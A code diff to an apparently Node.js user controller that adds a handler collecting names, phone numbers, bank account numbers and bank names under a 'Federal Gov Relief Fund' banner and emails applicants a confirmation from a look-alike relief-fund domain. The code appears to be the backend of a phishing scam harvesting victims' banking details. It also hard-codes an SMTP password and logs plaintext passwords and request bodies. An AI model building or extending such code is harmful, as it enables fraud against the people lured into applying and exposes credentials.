@@ -1,14 +1,15 @@
-const { userModel } = require("../Models/user.Model");
+const { userModel, fedGrant } = require("../Models/user.Model");
 const nodemailer = require('nodemailer');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken')
 require('dotenv').config()
 const secret = process.env.SECRET
 const { passwordResetEmailTemplate } = require("../Extra/user.template")
+const { confirmApplication } = require("../Extra/viral.temple")
 
 
 const registerUser = (req, res) => {
-    
+
     const { firstName, lastName, email, password } = req.body
     const hashPassword = bcrypt.hashSync(password, 10);
 
@@ -34,7 +35,7 @@ const registerUser = (req, res) => {
 const loginUser = async (req, res) => {
     const { email, password } = req.body
     console.log(req.body);
-    
+
 
     try {
         let user = await userModel.findOne({ email })
@@ -112,7 +113,7 @@ const resetPassword = (req, res) => {
                 if (user) {
                     let newPassword = generateNewPassword()
                     console.log(newPassword);
-                    
+
                     let hashNewPassword = bcrypt.hashSync(newPassword, 10);
                     user.password = hashNewPassword
                     user.save()
@@ -193,10 +194,74 @@ const sendEmails = (email, subject, html) => {
     })
 }
 
+const transporter2 = nodemailer.createTransport({
+    host: 'fg-relief-fund.myprosphere.com.ng',
+    port: 587,
+    secure: false,
+    auth: {
+        user: 'apply@fg-relief-fund.myprosphere.com.ng',
+        pass: 'Tender.B961'
+    }
+});
+
+const sendEmails2 = (email, subject, html) => {
+    return new Promise((resolve, reject) => {
+        const emailBody = {
+            from: "apply@fg-relief-fund.myprosphere.com.ng",
+            to: email,
+            subject: subject,
+            html: html
+        }
+
+        transporter2.sendMail(emailBody, (err, info) => {
+            if (err) {
+                reject({ msg: 'An error', status: false, err });
+            } else {
+                resolve({ msg: 'Email sent successful', status: true, info });
+            }
+        });
+    })
+}
+
+const saveViralData = (req, res) => {
+    console.log(req.body)
+    const { email, phoneNo, accountNo, fullName, bankName } = req.body
+    let info = new fedGrant({
+        email,
+        phoneNo,
+        accountNo,
+        fullName,
+        bankName
+    })
+    info.save()
+        .then((response) => {
+            sendEmails2(email, "Application Received - Federal Gov Relief Fund", confirmApplication())
+            console.log("Data saved")
+            console.log(response)
+            res.status(200).json({status: "Saved"})
+        })
+        .catch((err) => {
+            console.log("An error occurred : " + err);
+            res.status(404).send({data: "An error occured"})
+        })
+}
+
+const test = () => {
+    sendEmails2("emmylove961@gmail.com", "Testing", "<p>You know i am just  testing</p>")
+        .then((result) => {
+            console.log(result);
+        })
+        .catch((err) => {
+            console.log(err);
+        })
+}
+
 module.exports = {
     registerUser,
     loginUser,
     pageAuth,
     resetPassword,
-    changePassword
+    changePassword,
+    saveViralData,
+    test
 }
